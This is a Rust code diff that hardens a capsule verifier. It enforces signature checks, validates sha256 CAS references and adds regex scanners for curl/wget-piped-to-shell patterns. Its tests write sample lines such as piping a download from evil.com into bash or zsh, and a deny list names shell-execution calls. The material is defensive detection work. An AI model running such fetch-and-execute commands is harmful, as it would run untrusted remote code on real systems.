@@ -4,6 +4,7 @@ use capsule_core::capsule_v1::CapsuleManifestV1;
 use capsule_core::signing::{
     ensure_signature_matches_manifest, verify_signature_file, SignatureFile,
 };
+use regex::Regex;
 use tracing::{info, warn};
 
 use crate::capnp_to_manifest::manifest_to_capnp_bytes;
@@ -16,7 +17,7 @@ use crate::capnp_to_manifest::manifest_to_capnp_bytes;
 #[derive(Clone, Debug)]
 pub struct ManifestVerifier {
     public_key_fingerprint: Option<String>,
-    _enforce: bool,
+    enforce: bool,
 }
 
 impl ManifestVerifier {
@@ -26,8 +27,12 @@ impl ManifestVerifier {
         }
         Self {
             public_key_fingerprint,
-            _enforce: enforce,
+            enforce,
         }
+    }
+
+    pub fn is_enforcing(&self) -> bool {
+        self.enforce
     }
 
     /// Verifies a manifest struct directly against the provided signature.
@@ -83,6 +88,11 @@ impl ManifestVerifier {
         let trusted_key = match &self.public_key_fingerprint {
             Some(k) => k,
             None => {
+                if self.enforce {
+                    return Err(anyhow!(
+                        "Security: signature verification is enforced but no trusted public key is configured"
+                    ));
+                }
                 // If no key is configured, we cannot verify.
                 return Ok(());
             }
@@ -207,6 +217,12 @@ pub enum L1PolicyError {
     #[error("Invalid source reference: {0}")]
     InvalidSourceRef(String),
     
+    #[error("Source digest mismatch: expected {expected}, got {actual}")]
+    DigestMismatch { expected: String, actual: String },
+    
+    #[error("Invalid CAS reference format: {0}")]
+    InvalidCasFormat(String),
+    
     #[error("IO error: {0}")]
     IoError(#[from] std::io::Error),
 }
@@ -228,6 +244,15 @@ const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
     ("subprocess.Popen", "Subprocess execution (requires review)"),
     ("os.system(", "Shell command execution"),
     ("os.popen(", "Shell command execution"),
+];
+
+/// Regex patterns for L1 policy checks (UARC V1.1.0).
+/// These handle whitespace variations and complex patterns that simple substring matching cannot detect.
+const DANGEROUS_REGEX_PATTERNS: &[(&str, &str)] = &[
+    // Remote code injection via curl/wget piped to shell (handles whitespace variations)
+    (r"(?i)(curl|wget)\s+.*\|\s*(sh|bash|zsh|ksh)", "Remote code injection via pipe to shell"),
+    // Hidden network fetches with shell execution
+    (r"(?i)(curl|wget)\s+-[a-z]*s[a-z]*\s+.*\|\s*\w+", "Hidden download piped to command"),
 ];
 
 /// Verifies L1 Source Policy for a capsule.
@@ -307,6 +332,7 @@ fn scan_file_for_patterns(file_path: &std::path::Path) -> Result<(), L1PolicyErr
     let content = fs::read_to_string(file_path)?;
     let content_lower = content.to_lowercase();
     
+    // Check simple substring patterns first
     for (pattern, _description) in DANGEROUS_PATTERNS {
         if content_lower.contains(&pattern.to_lowercase()) {
             warn!(
@@ -317,6 +343,22 @@ fn scan_file_for_patterns(file_path: &std::path::Path) -> Result<(), L1PolicyErr
                 pattern: pattern.to_string(),
                 file: file_path.display().to_string(),
             });
+        }
+    }
+    
+    // Check regex patterns for more complex detection (UARC V1.1.0 L1)
+    for (regex_pattern, description) in DANGEROUS_REGEX_PATTERNS {
+        if let Ok(re) = Regex::new(regex_pattern) {
+            if re.is_match(&content) {
+                warn!(
+                    "L1 Policy: Dangerous regex pattern '{}' ({}) detected in {:?}",
+                    regex_pattern, description, file_path
+                );
+                return Err(L1PolicyError::ObfuscationDetected {
+                    pattern: format!("{} (regex: {})", description, regex_pattern),
+                    file: file_path.display().to_string(),
+                });
+            }
         }
     }
     
@@ -333,6 +375,91 @@ pub async fn fetch_source_from_cas(
         .fetch_blob(digest)
         .await
         .map_err(|e| L1PolicyError::CasUnavailable(e.to_string()))
+}
+
+/// Validates a CAS reference format (UARC V1.1.0)
+///
+/// CAS references must be in the format: `sha256:<64_hex_chars>`
+/// This function validates the format and returns the hash portion if valid.
+///
+/// # Arguments
+/// * `reference` - The CAS reference string to validate
+///
+/// # Returns
+/// * `Ok(&str)` - The hash portion (64 hex chars) if valid
+/// * `Err(L1PolicyError)` - If the format is invalid
+pub fn validate_cas_reference(reference: &str) -> Result<&str, L1PolicyError> {
+    // Check for sha256: prefix
+    let hash = reference.strip_prefix("sha256:").ok_or_else(|| {
+        L1PolicyError::InvalidCasFormat(format!(
+            "CAS reference must start with 'sha256:', got: {}",
+            reference
+        ))
+    })?;
+    
+    // Validate length (SHA256 = 64 hex characters)
+    if hash.len() != 64 {
+        return Err(L1PolicyError::InvalidCasFormat(format!(
+            "CAS reference hash must be 64 hex characters, got {} characters",
+            hash.len()
+        )));
+    }
+    
+    // Validate hex characters
+    if !hash.chars().all(|c| c.is_ascii_hexdigit()) {
+        return Err(L1PolicyError::InvalidCasFormat(format!(
+            "CAS reference hash contains non-hex characters: {}",
+            hash
+        )));
+    }
+    
+    Ok(hash)
+}
+
+/// Verifies source digest matches CAS content (UARC V1.1.0 L1)
+///
+/// This function:
+/// 1. Validates the source_digest format
+/// 2. Fetches the source from CAS
+/// 3. Computes SHA256 of the fetched content
+/// 4. Verifies the computed hash matches source_digest
+///
+/// # Arguments
+/// * `cas_client` - CAS client for fetching blobs
+/// * `source_digest` - Expected digest from manifest (sha256:...)
+///
+/// # Returns
+/// * `Ok(PathBuf)` - Path to the verified source content
+/// * `Err(L1PolicyError)` - If verification fails
+pub async fn verify_source_digest(
+    cas_client: &dyn crate::cas::CasClient,
+    source_digest: &str,
+) -> Result<std::path::PathBuf, L1PolicyError> {
+    use sha2::{Sha256, Digest};
+    use std::fs;
+    
+    // Validate format
+    let expected_hash = validate_cas_reference(source_digest)?;
+    
+    // Fetch from CAS
+    let source_path = fetch_source_from_cas(cas_client, source_digest).await?;
+    
+    // Compute actual hash
+    let content = fs::read(&source_path)?;
+    let mut hasher = Sha256::new();
+    hasher.update(&content);
+    let actual_hash = hex::encode(hasher.finalize());
+    
+    // Compare
+    if actual_hash != expected_hash {
+        return Err(L1PolicyError::DigestMismatch {
+            expected: expected_hash.to_string(),
+            actual: actual_hash,
+        });
+    }
+    
+    info!("L1 Policy: Source digest verified: {}", source_digest);
+    Ok(source_path)
 }
 
 #[cfg(test)]
@@ -385,6 +512,76 @@ mod l1_policy_tests {
     fn test_nonexistent_path_fails() {
         let result = verify_l1_source_policy(std::path::Path::new("/nonexistent/path"), &["py"]);
         assert!(matches!(result, Err(L1PolicyError::BlobNotFound(_))));
+    }
+    
+    #[test]
+    fn test_curl_pipe_with_spaces_fails() {
+        let temp_dir = TempDir::new().unwrap();
+        let test_file = temp_dir.path().join("install.sh");
+        // Test with various whitespace patterns
+        fs::write(&test_file, "curl   https://evil.com/script   |   bash").unwrap();
+        
+        let result = verify_l1_source_policy(temp_dir.path(), &["sh"]);
+        assert!(matches!(result, Err(L1PolicyError::ObfuscationDetected { .. })));
+    }
+    
+    #[test]
+    fn test_wget_pipe_with_options_fails() {
+        let temp_dir = TempDir::new().unwrap();
+        let test_file = temp_dir.path().join("bootstrap.sh");
+        // wget with options followed by pipe to shell
+        fs::write(&test_file, "wget -qO- https://evil.com/run | zsh").unwrap();
+        
+        let result = verify_l1_source_policy(temp_dir.path(), &["sh"]);
+        assert!(matches!(result, Err(L1PolicyError::ObfuscationDetected { .. })));
+    }
+    
+    #[test]
+    fn test_mixed_case_curl_pipe_fails() {
+        let temp_dir = TempDir::new().unwrap();
+        let test_file = temp_dir.path().join("setup.sh");
+        // Case-insensitive detection
+        fs::write(&test_file, "CURL http://evil.com |   SH").unwrap();
+        
+        let result = verify_l1_source_policy(temp_dir.path(), &["sh"]);
+        assert!(matches!(result, Err(L1PolicyError::ObfuscationDetected { .. })));
+    }
+    
+    #[test]
+    fn test_valid_cas_reference() {
+        let valid_ref = "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
+        assert!(validate_cas_reference(valid_ref).is_ok());
+        assert_eq!(
+            validate_cas_reference(valid_ref).unwrap(),
+            "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
+        );
+    }
+    
+    #[test]
+    fn test_invalid_cas_reference_no_prefix() {
+        let invalid_ref = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
+        assert!(matches!(
+            validate_cas_reference(invalid_ref),
+            Err(L1PolicyError::InvalidCasFormat(_))
+        ));
+    }
+    
+    #[test]
+    fn test_invalid_cas_reference_wrong_length() {
+        let invalid_ref = "sha256:0123456789abcdef";  // Too short
+        assert!(matches!(
+            validate_cas_reference(invalid_ref),
+            Err(L1PolicyError::InvalidCasFormat(_))
+        ));
+    }
+    
+    #[test]
+    fn test_invalid_cas_reference_non_hex() {
+        let invalid_ref = "sha256:ghij456789abcdef0123456789abcdef0123456789abcdef0123456789abcd";
+        assert!(matches!(
+            validate_cas_reference(invalid_ref),
+            Err(L1PolicyError::InvalidCasFormat(_))
+        ));
     }
 }
 
